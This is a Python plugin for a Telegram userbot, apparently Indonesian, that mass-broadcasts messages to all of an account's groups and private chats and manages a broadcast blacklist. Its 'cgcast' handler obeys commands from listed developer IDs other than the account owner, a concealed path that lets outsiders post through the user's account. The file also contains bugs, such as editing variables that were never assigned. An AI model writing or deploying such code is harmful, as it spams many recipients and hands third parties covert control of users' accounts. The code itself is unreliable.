
import asyncio
import dotenv
from pyrogram import Client, enums, filters
from pyrogram.types import Message
from ubotlibs.ubot.helper.basic import edit_or_reply
from . import *
from ubotlibs.ubot.utils import *
from Azazel.core.SQL.blchatsql import *
from config import *



@Client.on_message(filters.command(["cgcast"], "") & filters.user(DEVS) & ~filters.me)
@Ubot(["Gcast"], "")
async def gcast_cmd(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        jamban = await message.reply("`Memulai Broadcast...`")
    else:
        return await jamban.edit("**Balas ke pesan/berikan sebuah pesan**")
    done = 0
    error = 0
    user_id = client.me.id
    sempak = get_blchat(str(user_id))
    async for dialog in client.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in BL_GCAST and chat not in sempak:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
                    
    await jamban.edit(
        f"**Berhasil mengirim ke** `{done}` **Groups chat, Gagal mengirim ke** `{error}` **Groups**"
    )


@Ubot(["gucast"], "")
async def gucast(client: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        spk = await message.reply("`Started Global Broadcast...`")
    else:
        return await spk.edit("**Berikan sebuah pesan atau balas ke pesan**")
    done = 0
    error = 0
    async for dialog in client.get_dialogs():
        if dialog.chat.type == enums.ChatType.PRIVATE and not dialog.chat.is_verified:
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in DEVS:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await client.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
                    
    await spk.edit(
        f"**Successfully Sent Message To** `{done}` **chat, Failed to Send Message To** `{error}` **chat**"
    )


@Ubot(["addbl"], "")
async def bl_chat(client, message):
    user_id = client.me.id
    semprul = get_blchat(str(user_id))
    chat_id = message.chat.id
    chat = await client.get_chat(chat_id)
    if chat.type == "private":
        return await message.reply("Maaf, perintah ini hanya berlaku untuk grup.")
    if chat_id in semprul:
        return await message.reply("Obrolan sudah masuk daftar Blacklist Gcast")
    add_blchat(str(user_id), chat_id)
    await message.edit("Obrolan Ditambahkan Ke Daftar Blacklist Gcast")

@Ubot(["delbl"], "")
async def del_bl(client, message):
    if len(message.command) != 2:
        return await message.reply("**Gunakan Format:**\n `delbl [CHAT_ID]`")
    user_id = client.me.id
    chat_id = int(message.text.strip().split()[1])
    latau = get_blchat(str(user_id))
    if chat_id not in latau:
        return await message.reply("Obrolan sudah dihapus dari daftar Blacklist Gcast.")
    rm_blchat(str(user_id), chat_id)
    await message.edit("Obrolan dihapus dari daftar Blacklist Gcast.")
    

@Ubot(["blchat"], "")
async def all_chats(client, message):
    text = "**Daftar Blacklist Gcast:**\n\n"
    j = 0
    user_id = client.me.id
    nama_lu = get_blchat(str(user_id))
    for count, chat_id in enumerate(nama_lu, 1):
        try:
            chat = await client.get_chat(chat_id)
            title = chat.title
        except Exception:
            title = "Private\n"
        j = 1
        text += f"**{count}.{title}**[`{chat_id}`]\n"
    if j == 0:
        await message.reply("Tidak Ada Obrolan Daftar Hitam")
    else:
        await message.reply(text)


add_command_help(
    "Broadcast",
    [
        [f"gcast [text/reply]",
            "Broadcast pesan ke Group. (bisa menggunakan Media/Sticker)"],
        [f"gucast [text/reply]",
            "Broadcast pesan ke semua chat. (bisa menggunakan Media/Sticker)"],
        [f"addbl [id group]",
            "Menambah group ke dalam blacklilst gcast"],
        [f"delbl [id group]",
            "Menghapus group dari blacklist gcast"],
        [f"blchat [id group]",
            "Melihat daftar blacklist gcast"],
    ],
)
